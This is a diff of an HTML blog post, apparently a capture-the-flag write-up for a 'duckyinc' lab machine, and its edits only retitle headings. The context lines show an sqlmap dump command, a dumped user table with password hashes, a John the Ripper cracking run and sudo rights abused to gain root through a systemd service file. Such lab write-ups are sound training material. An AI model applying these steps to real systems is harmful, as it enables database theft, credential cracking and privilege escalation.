@@ -129,7 +129,7 @@ Requests/sec.: 0
 &lt;p&gt;We can check for SQL Injection vulnerabilities using SQLmap: &lt;code&gt;sqlmap -u http://10.10.212.230/admin --forms --dump-all&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;However,&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;[ERROR] all tested parameters do not appear to be injectable.
-&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;16-login-page-exploration-fail-can-be-skipped&#34;&gt;1.6. Login Page Exploration (Fail) (can be skipped)&lt;/h3&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;16-login-page-exploration-fail-can-be-skipped&#34;&gt;1.6. Login Page Exploration (fail) (can be skipped)&lt;/h3&gt;
 &lt;pre&gt;&lt;code&gt;GET /login?action= HTTP/1.1
 Host: 10.10.212.230
 Upgrade-Insecure-Requests: 1
@@ -167,7 +167,7 @@ Table: system_user
 | 3  | dhughes@duckyinc.org | dhughes      | $2a$12$22xS/uDxuIsPqrRcxtVmi.GR2/xh0xITGdHuubRF4Iilg5ENAFlcK |
 +----+----------------------+--------------+--------------------------------------------------------------+
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In the &lt;code&gt;user&lt;/code&gt; table we get the first flag :D&lt;/p&gt;
-&lt;h3 id=&#34;hash-cracking&#34;&gt;Hash Cracking&lt;/h3&gt;
+&lt;h3 id=&#34;18-hash-cracking&#34;&gt;1.8. Hash Cracking&lt;/h3&gt;
 &lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
 └─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
 Using default input encoding: UTF-8
@@ -255,7 +255,7 @@ Matching Defaults entries for server-admin on duckyinc:
 User server-admin may run the following commands on duckyinc:
     (root) /bin/systemctl start duckyinc.service, /bin/systemctl enable duckyinc.service, /bin/systemctl restart
         duckyinc.service, /bin/systemctl daemon-reload, sudoedit /etc/systemd/system/duckyinc.service
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Great! Looks like we have a way to root!&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Great! Looks like sudo can lead us to!&lt;/p&gt;
 &lt;h2 id=&#34;3-privesc&#34;&gt;3. PrivEsc&lt;/h2&gt;
 &lt;h3 id=&#34;31-getting-root&#34;&gt;3.1. Getting root&lt;/h3&gt;
 &lt;p&gt;Type in: &lt;code&gt;sudoedit /etc/systemd/system/duckyinc.service&lt;/code&gt; and replace the contents with the below.&lt;/p&gt;
